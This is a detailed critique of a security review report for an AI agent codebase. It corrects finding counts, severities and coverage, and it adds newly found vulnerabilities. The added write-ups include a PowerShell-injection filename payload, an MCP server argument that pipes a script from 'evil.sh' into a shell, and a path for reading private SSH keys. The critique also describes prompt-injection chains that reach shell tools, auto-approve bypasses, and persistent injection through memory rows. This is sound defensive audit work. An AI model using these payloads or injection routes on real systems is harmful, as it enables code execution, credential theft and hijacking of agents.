# Editorial and coverage critique of `.review/REPORT.md`

**Scope of this critique.** Recounted every number in the executive summary, Appendix A and
Appendix B against the nine raw reports and the tree; compared all 30 🔴 and 28 🟡 write-ups
against the raw report each cites; diffed the raw reports' `Test gaps` / `Documentation gaps`
/ `Improvement opportunities` sections against what survived consolidation; re-derived the
CSRF route inventory, the CORS configuration and the eval-baseline layout from source; and
read five high-risk files the review names as unaudited.

Full evidence for the M-findings in §6 is in `.review/_crit_scan_{A,B,C}.md` (targeted
full reads of `ui/routers/{memory,connectors}.py`, `ui/_chat_helpers.py` + `sse_translation.py` +
`document_monitor.py`, and `rag/{pdf,pptx}_utils.py` + `cpp/src/mcp_client.cpp`).

**Verdict up front. The findings are real and the evidence discipline is genuinely good — but
the counting layer is not.** Every per-file count in Appendix B is wrong, the probe count is
inflated ~40 %, one 🔴 contains a claim the report's own Appendix C refutes, and the most-quoted
number in the report (C9's "~28 of ~45 mutating routes") is wrong in both numerator and
denominator. Separately, a read of five files the report lists as "not read" produced **five
findings at 🔴 severity**, including a second PowerShell-injection sink that needs no model
involvement at all. The honest-gaps list is honest; it is also where the remaining criticals live.

---

## 1. Internal consistency

### 1.1 Appendix B per-file counts — wrong in 6 of 9 rows

Recounted by counting `###` headings carrying a severity emoji in each raw file (heading lists
verified by hand for `03` and `08`).

| File | Report says | Actual | Delta |
|---|---|---|---|
| `01-core-agent.md` | 11 / 16 / 6 | **11 / 20 / 6** | 🟡 −4 |
| `02-llm-install.md` | 2 / 17 / 8 | **2 / 20 / 10** | 🟡 −3, 🟢 −2 |
| `03-servers-security.md` | 5 / 20 / 10 | **5 / 26 / 17** | 🟡 −6, 🟢 −7 |
| `04-frontends.md` | 7 / 11 / 6 | **7 / 12 / 6** | 🟡 −1 |
| `04b-workers-website.md` | 1 / 7 / 6 | 1 / 7 / 6 | ✓ |
| `05-ci-release.md` | 2 / 13 / 3 | **2 / 14 / 3** | 🟡 −1 |
| `06-tests-eval.md` | 0 / 10 / 2 | 0 / 10 / 2 | ✓ |
| `07-docs.md` | 1 / 11 / 2 | 1 / 11 / 2 | ✓ |
| `08-domains-features.md` | 5 / 34 / 26 | **5 / 33 / 30** | 🟡 +1, 🟢 −4 |
| **Total** | 34 / 139 / 69 | **34 / 153 / 82** | |

**Edit:** replace the numbers with the "Actual" column and add a footnote:

> Raw totals are 34 🔴 / 153 🟡 / 82 🟢. The consolidated IDs are fewer because three 🔴 pairs
> merged (`01`'s two shell criticals plus `03`'s → C4; `01`'s `find_files` plus `08`'s RAG
> extractors → C7; `07`'s navbar plus `05`'s publish gate → C29) and because ~50 raw 🟡 were
> folded into multi-part I-entries (I13, I42, I43, I55, I74) or absorbed into a 🔴 (three of
> `01`'s 🟡 became C7(d)–(f)).

That footnote also fixes a second problem: "30 critical, 99 important and ≈120 minor" reads as
a count of *findings*, but 30 and 99 count consolidated IDs while ≈120 counts individual §4
items. Say so.

### 1.2 The headline counts themselves

- **30 🔴 — correct.** 34 raw minus 4 merges; the arithmetic checks out.
- **99 🟡 — correct as an ID count** (99 distinct `I<n>.` markers), but it compresses 153 raw
  findings. See the footnote.
- **≈120 🟢 — defensible.** §4 holds ~117 discrete items across 16 bold group headers (raw 🟢
  headings are 82 because several are "nits" clusters). Say "≈120 distinct minor items,
  condensed from 82 raw entries".
- **"~150 things checked and found sound" — correct.** Appendix C holds ~140 semicolon-separated
  items across 17 bullets. Keep.

### 1.3 "~40 of them were additionally reproduced by executing a probe (noted as *probe*)"

**Wrong, and self-refuting.** The report marks exactly **29** findings with a probe (C1–C7, C11,
C15, C17, C19, C20, C24, C30; I5, I10, I13, I14, I29, I38, I43, I45, I46, I51, I52, I53, I55,
I56, I99). The raw reports mark **26**. The phrase "noted as *probe*" makes the claim checkable
against the document, and it fails.

**Edit (§0 Verification standard, and Appendix A bullet 1):**

> ~~and ~40 of them were additionally reproduced by executing a probe (noted as *probe*)~~ →
> **29 of them were additionally reproduced by executing a probe (marked *probe*); four more
> were verified against live systems or the installed binary without that marker — C9 (FastAPI's
> 422 on a `text/plain` body), C10, C21 (the released `gaia-agent.exe`), and the `gh api` runs
> behind C14/§6.**

### 1.4 "Five criticals have a related open issue; none is fully tracked"

The count of `Tracked: <issue>` entries is 5 (C7 #3316, C8 #630/#2951, C26 #124, C29 #1128,
C30 #3101) — but **five more criticals cite an adjacent open issue in the same field**: C4
(#2785), C11 (#2951), C18 (#1460), C21 (#2474), C25 (#2985/#702). As written the sentence
undercounts what a triager would find.

**Edit:** "Five criticals carry a tracking issue (#124, #630, #1128, #3101, #3316) and five more
name an adjacent one (#1460, #2474, #2785, #2951, #2985); none is fully tracked."

### 1.5 Cross-references that point at the wrong thing

- **§1 item 4 says "bypassed by seven tools"; C7 lists six *groups* containing fifteen tools**
  (`find_files`, `index_directory`, four binary extractors, `analyze_image`,
  `answer_question_about_image`, `list_files`, `browse_directory`, `search_directory`,
  `search_file`, `list_recent_files`, `dump_document`, `take_screenshot`).
  **Edit:** "bypassed across six tool families — fifteen tools in all".
- **§8 item 14 and I52 propose different fixes for the same finding** — I52 wants an identity
  check to replace the row-count check; §8.14 wants `metadata.json` signed. Name both or pick one.
- **§9 A1's "#3016: 0 of 235 runs" has two conflicting sources in the raw report** — `08:606`
  says "0 successes / 62 failures / 124 cancelled" (186) and `08:644` says "0 of 235". Pick one
  and state the window.
- **"≈3,000 lines" of raw reports** — the actual total of `01`–`08` + `04b` is **3,637**, plus
  ~1,600 in the `_08_*` sub-reports. Say "≈3,600 (plus ~1,600 in sub-reports)".
- **697 vs 698 open issues.** The scope table and §9's preamble say 697; the headline line and
  §9 B12 say 698; Appendix B says 697. Use 698 (the coordinator's count) in all four places.

### 1.6 A "checked and fine" item that directly refutes a 🔴 — the worst of these

**C8 says:** "`src/gaia/api/openai_server.py:178` carries the same wildcard".
**Appendix C says:** "API CORS never wildcard+credentials in `openai_server.py:161-190`".

Appendix C is right; C8 is wrong. At HEAD `_cors_config()` returns `allow_origins=[]` +
`allow_origin_regex=_LOCAL_ORIGIN_REGEX` + `allow_credentials=True` by default. Line 178 is
*inside* an opt-in branch that fires only when the operator sets `GAIA_API_CORS_ORIGINS=*`, and
that branch explicitly sets `allow_credentials=False`:

```python
# src/gaia/api/openai_server.py:168-181
raw = os.environ.get("GAIA_API_CORS_ORIGINS", "")
origins = [o.strip() for o in raw.split(",") if o.strip()]
if "*" in origins:
    logger.warning("GAIA_API_CORS_ORIGINS='*': allowing all origins WITHOUT credentials...")
    return {"allow_origins": ["*"], "allow_credentials": False, ...}
```

The docstring above it names the exact threat and says the combination "is never configured".

This is an **unresolved cross-reviewer discrepancy**: the `01` reviewer raised it as a
parenthetical "flagged for the API reviewer", the `03` reviewer checked it and cleared it, and
the consolidation kept both. Appendix A's discrepancy log does not mention it.

**Edit to C8:** strike the openai_server wildcard clause and replace with:

> The generic `AgentServer` carries `allow_origins=["*"], allow_credentials=True`
> (`server.py:442-446`, verified) — Starlette reflects the requesting Origin in that
> configuration. `src/gaia/api/openai_server.py` does **not**: its default is a loopback origin
> regex, and its `*` branch is opt-in and drops credentials. The OpenAI server's real gap is
> auth, not CORS — `/v1/chat/completions` has none (only the `/v1/<agent>/*` relay checks
> `GAIA_API_KEY`), and the docs' first example binds `0.0.0.0` (`api-server.mdx:24`).

Then add a line to Appendix A's discrepancy log recording it.

### 1.7 C9's route inventory is wrong in both directions

The report says "~28 of ~45 mutating routes are CSRF-able". Re-derived from
`src/gaia/ui/routers/*.py` by parsing the decorators:

| | Count |
|---|---|
| Mutating route decorators (`post`/`put`/`delete`/`patch`) | **75** (48 / 12 / 14 / 1) |
| Carrying `_require_ui_header` in the decorator | **22** |
| Unguarded POST routes | **35** |
| Unguarded POSTs actually browser-forgeable (no Pydantic body: body-less, path-only, query-only, `Optional[...] = None`, or multipart) | **15** |

The 15: `documents.cancel_indexing`, `documents.reindex_document`,
`documents.upload_document_blob` (multipart), `files.upload_file` (multipart),
`mcp.start_agent_mcp_server` (`Optional` body, so an empty POST works),
`mcp.stop_agent_mcp_server`, `memory.trigger_consolidation`, `memory.rebuild_embeddings`,
`memory.trigger_reconciliation`, `memory.rebuild_fts`, `memory.prune_memory`,
`memory.refresh_system_context`, `sessions.activate_session`, `tunnel.start_tunnel`,
`tunnel.stop_tunnel`.

**Six are not named anywhere in the report:** `rebuild_embeddings`, `rebuild_fts`,
`refresh_system_context`, `trigger_reconciliation`, `stop_tunnel`, `activate_session`.
`refresh_system_context` calls `store.delete_by_category("system")` and re-scans the host — it
is destructive and body-less.

**Edit to C9's first sentence:**

> **C9. 50 of 75 mutating Agent-UI routes carry no CSRF guard; 15 are forgeable from any website
> today** 🔒 — the `X-Gaia-UI` preflight guard is on 22 route decorators. The other 28 are
> protected only *incidentally*, by FastAPI returning 422 for a `text/plain` body on a
> Pydantic-typed route — which is not a security control: any route that switches to `dict`,
> adds `Optional[Body] = None` (as `mcp.start_agent_mcp_server` already has), or accepts
> multipart becomes exploitable silently. The 15 live ones are …

Add to the fix: **the guard is defined four times** — `routers/agents.py:58`,
`routers/connectors.py:106`, `routers/hub.py:53`, `routers/memory.py:41`. Four copies of a
security check is how `memory.py` ended up applying its own copy to 3 of ~20 routes. That
belongs in §8 item 5's duplicate-implementations list, which currently misses it.

### 1.8 Duplicated findings that should be merged

- **I36 is a strict subset of C1** and says so. Cut its body to one line: "The live instance of
  C1: `web/tavily.py:125,145` to `connectors/handler.py:399-410` skips grants when
  `required_scopes` is empty; `test_handler.py:161` locks it in."
- **I35's trailing clause hides a 🔴-class fact** ("the Agent UI allowlist is the parent dir of
  every attached document"). See M3 — it should be its own finding.
- **I25 and I86 are the same finding** ("= I25, CI side" is stated). Merge into one entry with
  two `Where:` lines; today §6.4, §8.10 and §10 each have to name both.
- **I3 and M6 are the same bug with two sinks.** I3 names only the max-steps `input()`; the far
  more reachable sink is `security.py:462 _prompt_user_for_access`. Merge and re-rank.
- **The "43 orphaned test files" number appears four times** — §3.9 I74, §3.11 I82, §5 item 2,
  §6 item 6. State it once (§5) and cross-reference.
- **I93 is not one finding, it is fourteen.** See §5 of this critique.

---

## 2. Fidelity to evidence

I compared all 30 🔴 and 28 🟡 against the raw report each cites. The consolidation is unusually
faithful — caveats survive more often than not (C12's WHATWG Medium, C15's "Medium on
prevalence", C25's "audible loop depends on room level", I3's "not reproduced live" are all
preserved). The failures below are the exceptions.

### 2.1 Claims strengthened beyond the evidence

**(a) C8 — a refuted clause.** §1.6 above. The only outright false claim I found in a 🔴.

**(b) Exec summary #3 drops C4's gating precondition.**

- §1 #3: "unspaced `&`, `>&`, PowerShell `-e`, aliases, and `.NET`/WMI static calls all run
  arbitrary commands through `cmd.exe` … Both are reachable from prompt-injected content."
- Raw `03`: "needs the confirmation click unless auto-approve is on." Raw `01`: "With
  `GAIA_AUTO_APPROVE_TOOLS`, `auto_approve_gated_tools`, or a session 'always allow' grant on
  `dir`, nobody is asked."

C4's own body keeps the caveat; the summary a reader acts on does not.
**Edit §1 #3:** append "— behind one confirmation click, or none at all under
`GAIA_AUTO_APPROVE_TOOLS`, `auto_approve_gated_tools`, or a session 'always' grant."

**(c) Exec summary #9 drops C12's "one click".**

- §1 #9: "an LLM-rendered link can launch a local binary (C12)".
- C12's own title: "**one click** on an LLM-rendered link can launch a local binary".
  **Edit:** restore "one click on".

**(d) Exec summary #8 states C25 as fact.**

- §1 #8: "`gaia talk` transcribes its own voice (C25)".
- Raw `08`: "Confidence High for the missing pause + 5 s early return (code trace); **the
  audible loop depends on room/speaker level**."
  **Edit:** "`gaia talk` never pauses the mic while it speaks, so on laptop speakers it can
  transcribe its own reply (C25)".

**(e) C6 omits its attacker precondition from the body.** The title says "from a hostile or
MITM'd hub", but the body never states that the default hub is HTTPS and that the primitive
requires a compromised hub, a private `GAIA_HUB_URL` mirror, or a plain-`http://` hub — all of
which raw `01` states. A reader triaging from the body alone over-rates it.
**Edit:** add after C6's first sentence: "Precondition: the manifest must come from an
attacker-controlled source — a compromised hub, a plain-`http://` or private `GAIA_HUB_URL`
mirror, or a MITM on one. The default hub is HTTPS; this is a broken defence-in-depth finding,
not a live exploit."

**(f) I41 drops the privilege bound.**

- Report: "the default bot answers anyone, indexes strangers' uploads into the user's global RAG
  library, no rate limit".
- Raw `03`: "**Remote**, limited to chat/RAG privileges (AgentSDK carries no shell/file tools —
  verified in `src/gaia/chat/sdk.py`)."

That bound is *why* I41 is 🟡; dropping it makes the severity look wrong.
**Edit:** append "(bounded: the Telegram path runs `AgentSDK`, which carries no shell or file
tools — verified)".

**(g) C8 "on every hub package".** Report: "`--api` on every hub package". Raw: "the server every
hub package is *told to use* for `--api`". **Edit:** "the server hub packages are documented to
use for `--api`".

**(h) §0.1 "ran the relevant unit tests on this commit".** Not true of all eight: `07` (docs) and
`04b` (Workers/website) ran no pytest — `04b` used live `curl` probes instead.
**Edit:** "…ran the relevant unit tests where the dimension had any (docs and Workers used live
probes and static checks instead)".

### 2.2 Dropped confidence qualifiers

| Finding | Raw confidence | Report | Fix |
|---|---|---|---|
| I8 | "High (code) / **Medium (exploitability)**" | no confidence given | restore the Medium |
| I58 | "High (code) / **Medium (exploitability)**" | keeps the "Impact bounded" prose, drops the label | add "(Medium on exploitability)" |
| C25 | "High for the mechanism; the loop depends on room level" | preserved in C25, **lost in §1 #8** | see 2.1(d) |
| C27 | crash propagation "**traced** from the emit site" | "Confidence High", undifferentiated | "High on the missing method (verified); the crash-to-`process.exit` path is traced, not reproduced" |

### 2.3 Line numbers

I re-opened every line range cited in the 🔴 section that could be checked cheaply. **All were
correct**, including the ones most likely to drift: `filesystem_tools.py:52` (the "All path
parameters are validated" docstring — exact), `shell_tools.py:192-203` (the `&(?=\s|$)` operator
regex — exact), `tools.py:79-87` (unconditional `_TOOL_REGISTRY[tool_name] = {…}` — exact),
`memory.py:1628` (`store.get_history(session_id, limit=20)` — exact; the comment above it says
"oldest first", which is *also* wrong and strengthens C20), `server.py:441-448` (wildcard +
credentials — exact), `docs.json:508` (stale navbar label — exact). The one slip is cosmetic:
the `0.0.0.0` example in `api-server.mdx` is line 24, not 25.

This is the strongest part of the report. Say so in Appendix A rather than leaving it implied.

---

## 3. Dropped value — present in the raw reports, missing from the consolidation

Ranked by what a maintainer loses. Every item was verified absent from `REPORT.md` by grep.

**1. `_kill_stale_ngrok` kills every ngrok process on the machine, on every tunnel start.**
`03` → Improvement opportunities. `src/gaia/ui/tunnel.py:520-535`, called unconditionally at
`:391`. Confirmed at HEAD: `taskkill /f /im ngrok.exe` on Windows, `pkill -x ngrok` on POSIX. A
developer running `ngrok http 3000` for their own project loses it the moment they click "Start
tunnel" in the Agent UI, with no warning. The docstring defends *exact-name* matching but never
addresses killing the user's other agents. **This is a 🟡 finding, not an improvement note** —
add it next to C10.

**2. `rich.Console().print` in the Lemonade client corrupts MCP stdio framing.**
`02` → Improvement opportunities. `lemonade_client.py:3281-3303` prints "🔄 Loading model: …" to
**stdout** unconditionally. `route_console_logging_to_stderr()` (`logger.py:289`) reroutes only
logging *handlers*, not `print`/`Console`. Both stdio servers depend on it and say so:
`mcp/agent_mcp_server.py:322-325` — "request-time log lines would still corrupt the stream, so
redirect the console handler too" — and `cli.py:7887-7891`. So the first model load inside
`gaia mcp serve --stdio` emits a non-JSON line into the JSON-RPC stream.
**🟡, arguably 🔴 (breaks a shipped transport in normal use).** Verified at HEAD.

**3. `publish_agents.yml`'s publish job is disabled (`if: false`, #1179) — which is *why* C30
exists.** `05` → Documentation gaps. C30 proposes fixing the website's pip tab, but the root
cause is that no Python agent wheel is published at all, so the same tab is wrong for `chat`
(#3101) and for every future agent. **Edit C30's Fix** to lead with: "either publish the wheels
(`publish_agents.yml` is `if: false` pending #1179) or stop advertising pip."

**4. `find_scenarios` silently honours user-local scenario overrides.** `06` → Improvement
opportunities. A local file shadowing a built-in scenario id is not logged and not recorded in
the scorecard `config`, so a "baseline comparison" can run against customised scenarios and look
clean. Given that §9 A1 makes the eval gate the #1 feature priority, an undetectable way to fake
a passing scorecard belongs in §3.10 as a 🟡.

**5. Five workflows have no top-level `permissions:` block** — `pypi.yml`, `docs.yml`,
`check_doc_links.yml`, `update-release-branch.yml`, `claude-run.yml` (`05`). Two are on the
release path. Belongs in §3.11 next to I81, or at minimum in §10's supply-chain bullet.

**6. Worker/R2 test gaps are entirely absent from §5.** `04b`'s `Test gaps` section is the only
reviewer's that did not survive at all: `FakeR2.put` ignores `onlyIf` (so a future
conditional-write fix for I94 would pass without proving anything), `FakeR2.list` always returns
`truncated: false` (the cursor loops in `listAgentIds`/`listSkillNames` are untested), no test
injects a mid-publish R2 failure (I95), no test publishes a reserved filename (I96), and nothing
ever runs a real by-reference PUT against R2 (`util/check_r2_credentials.py` is run by no
workflow). §5 claims to be "tests as a system"; it currently covers seven of eight dimensions.

**7. No unit test exists for `util/validate_release_notes.py` itself** (`05`;
`grep -rl validate_release_notes tests/` is empty). §10 Week-1 item 1 proposes running it in
`docs.yml` — worth noting the validator itself is unverified.

**8. `tests/unit/test_amd_gaia_urls.py` scans only `src/gaia/`** (`07`). Hub READMEs render on
npm and are outside the glob. One-line fix; prevents a repeat of I88's class.

**9. Duplicate-implementation instances missing from §8 item 5:** `_require_ui_header` ×4 (§1.7);
`session_registry.py` vs `gaia_agent_email.agent_routes._SessionRegistry` (`01`); three
email-fact builders in `discovery.py` (`01`); `subprocess.go detectLemonadeURL` vs
`preflight/local.go probeLemonade` (`04`); `release_agent_{email,chat,gaia}.yml` — 2,370 lines of
copy-paste over one shared skeleton (`05`).

**10. Test gaps named in `01` that §5 drops:** zero tests reference
`_shrink_messages_for_overflow` or `_resolve_plan_parameters`; `STATE_EXECUTING_PLAN` plan
execution (`$PREV`/`$STEP_N` substitution, error → recovery) has no coverage at all. §5's
"per-area gaps worth tests first" list covers every other reviewer's items.

**11. Smaller drops worth one line each:** `install_skill` writes the provenance lock *after*
`copytree`, so a lock failure leaves an unattributed installed skill (`01`); `DocumentLibrary`
swallows all poll/refresh errors at `:144,190` (`04`); `docs/reference/dev.mdx` does not say
`[ui]` is required for `tests/unit` to even *collect* (`06`); session-scope `require_lemonade`
(31 s wasted per skipped file, `06`); `publish.yml:238-243`'s stale "#1315" comment (`05`);
`hub-publishing.mdx:326`'s "redeploy is triggered automatically" (true only for the
`workflow_dispatch` path, `05`); #3088 — the README says thirteen starter skills, the guide says
ten (`08`); **#2884 — the NPU context-overflow misroute, which is I20's tracking issue, while
I20 says nothing under `Tracked:`**.

---

## 4. Ranking and framing

### 4.1 Severity re-checks against REVIEW.md

REVIEW.md: 🔴 = "security, breaking changes, data-loss risk, or a bug that will fire in normal
use"; 🟡 = "a real bug in an edge path, missing tests for new logic, or an
architecture/convention violation"; the tiebreak is "would this break or mislead a user?"

**Over-ranked (🔴 → 🟡): C30.** The hub page advertises a nonexistent pip package. Nothing
breaks, nothing is lost, no security impact — a user copies a command and gets a clean "No
matching distribution found". REVIEW.md files "doc that contradicts code" at 🟡 explicitly. It is
the weakest 🔴 in the set and it occupies a slot in a list a maintainer reads as "the thirty
worst things". Keep it in §3.13; drop the 🔴.

**Under-ranked (🟡 → 🔴) — four, in order:**

1. **I34 — the tunnel token is a read token for all of `$HOME`.**
   `GET /api/files/preview?path=~/.ssh/id_ed25519` with the bearer returns the private key;
   `~/.gaia` credential stores are listable. This is a documented, advertised feature ("mobile
   chat") handing out whole-home read access, and the report itself notes it is *also* reachable
   without a tunnel via C9's rebinding read side. Under REVIEW.md that is security, full stop. It
   is currently a trailing clause in §1 #5.
2. **I35 — write guardrails miss `~/.bashrc`, `~/.config/autostart`, `.git/hooks`, PowerShell
   `profile.ps1`.** A login-persistence primitive that passes `validate_write` and renders a
   benign-looking modal. Combined with M3 below it is the cleanest injection → persistence chain
   in the report.
3. **I84 — fork PRs run on persistent self-hosted Windows runners** across nine workflows with no
   same-repo gate, on a box with a reused `.venv`, Lemonade and models, protected only by
   first-time-contributor approval. C14 is 🔴 for a strictly narrower version of this.
4. **I11 — the LLM extractor can mint `profile`/`system`/`permission` memory rows.** Those render
   at the top of *every future system prompt*, and `memory_store.py:112-118` states the invariant
   the code violates. That is persistent prompt injection, not an edge path. (M7 below is a second
   route to the same write.)

**Borderline, keep 🔴 but state the precondition:** C6 (needs a hostile hub — §2.1(e)); C27 (the
badge failure is cosmetic; the 🔴 rests on a traced-not-reproduced crash path).

### 4.2 The "ten things to fix first"

The ten buckets are well chosen and the grouping is genuinely useful. Three problems.

**(a) Item 1 is not actionable as written — and it is the item most likely to be attempted
first.** It ends "Then tag." Tagging today does three things the report documents elsewhere and
never connects:

- `update-release-branch.yml` force-moves `release` on the tag, independent of validation or
  approval (§3.11);
- `release_components.yml` races the same tag, has never succeeded, and redeploys the Cloudflare
  Worker *before* any approval (I82);
- **`email-eval` — the release gate inside `publish.yml` — is currently red on Anthropic billing
  (I83), so the tag stalls before approval for a reason unrelated to any of this.**

I83 appears in neither Week 1 nor Month 1's release bullet.

**Edit item 1:** "Unblock the release (C29 + I83 + I82): fix the navbar label, the `## What's
New` section and the notes' commands; clear the `email-eval` billing block or make that gate
non-required; disable or chain `update-release-branch.yml` and `release_components.yml` so the
tag does not fire them out of order. *Then* tag."

**(b) Two swaps.** Item 5 spends its whole line on C8/C9/C10/C11 and relegates I34 to a trailing
clause; promote I34 into the sentence ("…and the tunnel token, when it applies, is a read token
for `~/.ssh` and the connector credential store"). And **I72, the Windows unit lane, belongs in
the ten** — §10 Week-1 item 11 calls it "the cheapest single change that would have caught
several of the above on the day they landed", a stronger claim than several items that did make
the list. Add it as item 11, or fold it into item 1. As written, §1 and §10 disagree about how
important it is.

**(c) The list is ten buckets holding ~25 fixes.** Items 5, 7, 8 and 9 each bundle four. That is
the right editorial call, but say it: "Ten themes, ~25 changes."

### 4.3 Are §9's feature opportunities grounded?

**Yes — this section needs no defence.** I traced every item back to `08 §B`: A1
(#3016/#2960/#1315/#3294/#2958), A3 (#3090/#3057/#2848/#2695), A4 (#686/#2780/#2831/#2772), A5
(#1676/#1746/#2972/#3152/#3175), A6 (#2260/#1074/#3293/#3290/#3236), B9 (#2062/#3133/#3239), B10
(#632/#1236/#2875/#649), B11 (#702/#373/#386). Each names both an issue and a code path, and the
"three ✅ / five ⚠️ / two ❌" landing-page scoring is reproduced from a table in the raw report.

Two small gaps: **A4 drops four of the five open memory bugs** the raw report lists (#2686
KV-prefix discard, #2676 truncated procedures, #2865 outcome counters, and **#3173 "neither
documented way to turn memory on works"** — a user-facing blocker for the whole feature), and
**A5 drops #2884**, which is I20's tracking issue.

---

## 5. Voice and readability

The report is intentionally comprehensive and mostly earns its length. Six surgical cuts.

**(a) §0 "How to read this report" — cut five of six bullets.** They describe what sections 1–10
and the appendices contain, which the headings already say. Keep only the severity definition and
the verification standard. Saves ~180 words at the point a reader is deciding whether to keep
reading.

**(b) §1's opening sentence is 118 words and buries the finding.** CLAUDE.md: "Open with the
finding." Today the finding — "the problems are almost all at the seams" — arrives after eight
semicolon-separated strengths. **Rewrite:**

> GAIA's security primitives are individually good and collectively unenforced. Constant-time
> compares, an SQLite authorizer allow-list, a real SSRF validator, HMAC-signed caches, Ed25519
> skill signing, a confirmation gate MCP and REST cannot bypass — each exists, and each is
> skipped at some call site that forgot to invoke it. That is the shape of almost every finding
> here: primitives that exist but are not wired everywhere, boundaries enforced by convention
> rather than by construction, tests that prove a call happened rather than that it was valid,
> and a Windows platform no automated lane exercises. (Appendix C lists ~150 things that were
> checked and found sound.)

**(c) I93 is fourteen findings in one 450-word bullet.** It is the least usable paragraph in the
report — a maintainer cannot assign, track, or close any part of it. **Convert to a table** with
columns `Doc` / `Claims` / `Code says` / `Ref`. Same treatment for I45 (five daemon findings in
one bullet) and I92 (nine).

**(d) §4's minor findings are 16 paragraphs of 8–15 sentences each.** Each paragraph is a
subsystem; each sentence is an item. Nest them: bold subsystem header, one bullet per item. No
content change, roughly 3× the scan speed.

**(e) Findings that restate their own title before adding anything:** C9, C13, C21, C24, C29. Cut
the first clause of each body; start at the em-dash where the evidence begins. ~150 words.

**(f) Appendix A bullet 2 is process narration.** "Cross-reviewer duplicates were merged (… each
found independently by two reviewers — a useful signal for their reality)" — keep the signal
clause, cut the list of seven. Bullet 3 (the discrepancy log) is the opposite: the most valuable
paragraph in the appendices, and it should *grow* by one entry (§1.6).

**(g) Add one theme the report is missing.** "Structural themes" names five patterns but not
the one that produced C2, C4, M1 and M2: **a list of arguments flattened into a string that
some interpreter then re-parses.** Four criticals across two languages are the same mistake —
`notify_desktop`'s f-string into `-Command`, the Windows shell path handing a validated
*string* to `cmd.exe`, the PPTX path interpolated into a PowerShell literal, and the C++ MCP
client's `/bin/sh -c`. Naming it turns four separate fixes into one review rule: *never
rebuild a command as text; pass argv.* (The mirror-image theme — "an error path that returns
the shape of success" — the report already has, as the silent-fallback bullet.)

**Do not cut:** "Structural themes", "What is in good shape", the "What is good" openers in
§5–§7, or Appendix C. Those are what make the report readable as an argument rather than a list,
and Appendix C is the highest-leverage section for the next reviewer.
---

## 6. Coverage gaps

### 6.1 Areas in the tree that appear in neither the §0.1 scope table nor Appendix A's honest-gaps list

Not "not read" — **not mentioned at all**, so a reader cannot tell they were skipped:

| Area | Why it matters |
|---|---|
| `src/gaia/ui/routers/schedules.py` | Four mutating routes creating cron-scheduled prompt/skill runs — a persistence primitive. In neither the read nor the not-read column. |
| `src/gaia/ui/{agent_loop,sse_handler,build,models,dependencies}.py` | `sse_handler.py` owns the confirmation-over-SSE path Appendix C vouches for. |
| `src/gaia/config.py`, `src/gaia/factory/` | CLAUDE.md's no-silent-fallback rule names config loaders specifically; nobody read the config loader. |
| `hub/components/` | Two published manifests (`agent-ui`, `terminal-hub`) the Worker serves and `catalog.ts` renders — directly relevant to C30 and to 04b's "`/hub/agent-ui` is a 404 today". |
| `cpp/src/{security,file_tools,process,tool_registry,agent,repl}.cpp` | Appendix A names `mcp_client`, `skill*`, `database`, `tui_*` as unread but omits these — and `security.cpp` / `file_tools.cpp` / `process.cpp` are the exact classes (path handling, process launch) where the Python side produced 🔴s. **`mcp_client.cpp` turned out to hold a 🔴 — M2 below.** |
| `docs/{runbooks,spikes,playbooks,presentations,superpowers,local-test,issues,testing,connectors}/`, `docs/server.js`, `docs/Dockerfile`, `docs/railway.json` | The docs site's own Railway deployment — which `04b` found is the uncached origin behind I99 — was reviewed by nobody. Also **`docs/eval.md` and `docs/eval.mdx` both exist**; the `.md` is a "Documentation Moved" stub not referenced by `docs.json`, i.e. a 🟢 orphan the docs reviewer's `docs.json`-vs-disk check could not see because it only walks forward. |

**Edit:** add these rows to the scope table's "Not read" column so the honest-gaps claim is
actually complete.

### 6.2 Five highest-risk unreviewed files — read

I read the five I judged highest-risk: `ui/routers/memory.py`, `ui/routers/connectors.py`,
`ui/_chat_helpers.py`, `rag/pptx_utils.py` + `rag/pdf_utils.py`, and `cpp/src/mcp_client.cpp`.
**Four of the five produced findings at 🔴 severity**, plus four more at 🟡 — fourteen findings
in all (M1-M14). That is the most important result in this critique: the report's honest-gaps
list is not a tail, it is where the remaining criticals are.

---

## Missed by the review

### M1. 🔴 PowerShell command injection via a document *filename* — no model, no confirmation

- **Where:** `src/gaia/rag/pptx_utils.py:313-336` (`convert_pptx_to_pdf`), reached from
  `src/gaia/rag/sdk.py:1048` (`_extract_text_from_pptx`).
- **What:** The PPTX→PDF fast path f-string-interpolates the absolute file path into a
  *single-quoted PowerShell string literal* and runs it with `powershell -NoProfile -Command`. A
  `'` in the path closes the literal; the remainder of the filename is parsed as PowerShell.
- **Failure scenario:** A deck named `quarterly'; Start-Process calc; '.pptx` is uploaded through
  the Agent UI documents endpoint. `_sanitize_stem` (`ui/routers/documents.py:123`) strips only
  `<>:"/\|?*` and control characters — the quote survives to disk. **Indexing the document is
  enough**: no tool call, no model decision, no confirmation modal.
- **Evidence:**
  ```python
  # pptx_utils.py:313-327
  ps_script = ("$ErrorActionPreference = 'Stop'; "
               "$ppt = New-Object -ComObject PowerPoint.Application; "
               f"  $pres = $ppt.Presentations.Open('{pptx_abs}', "
               f"  $pres.SaveAs('{pdf_abs}', 32); ")
  ```
- **Fix:** pass the paths as `-Command "param($in,$out) …" -args`, or `-EncodedCommand` with
  escaped literals; reject `'` in `_sanitize_stem`. Add a quote-in-filename test.
- **Why it matters editorially:** C2 is the same class *with a model in the loop*. M1 needs no
  model at all, so it is strictly more reachable. `rag/pptx_utils.py` is listed in Appendix A as
  unread.
- **Confidence:** High.

### M2. 🔴 The C++ MCP client hands every server argument to `/bin/sh -c` unescaped

- **Where:** `cpp/src/mcp_client.cpp:550-565` (`StdioTransport::connect`), `:448` (POSIX
  `Impl::launch`), `:650-674` (`MCPClient::fromConfig`).
- **What:** `connect()` concatenates `command_` plus every element of `args_` into one string.
  `quoteArg` wraps an argument in double quotes *only if it contains a space* and escapes nothing
  — not a quote, backslash, `$`, or backtick. The result goes to
  `execl("/bin/sh", "sh", "-c", cmdLine.c_str(), nullptr)`. **A shell is involved** (not
  `execvp`, not `posix_spawn`).
- **Failure scenario:** an `mcp_servers.json` entry with
  `"args":["-y","@scope/server","--token","; curl evil.sh | sh ;"]` — from a connector install, a
  hub package, or a synced dotfile — executes the injected pipeline at the next MCP connect. The
  confirmation gate at `:170-189` classifies *tool names*, never the server *launch*, so nothing
  prompts. Even benignly, any legitimate arg containing `$`, `&`, `*`, `(` or a backtick is
  silently mangled.
- **Evidence:**
  ```cpp
  // mcp_client.cpp:551-559
  auto quoteArg = [](const std::string& arg) -> std::string {
      if (arg.find(' ') != std::string::npos) { return "\"" + arg + "\""; }
      return arg; };
  // mcp_client.cpp:448
  execl("/bin/sh", "sh", "-c", cmdLine.c_str(), nullptr);
  ```
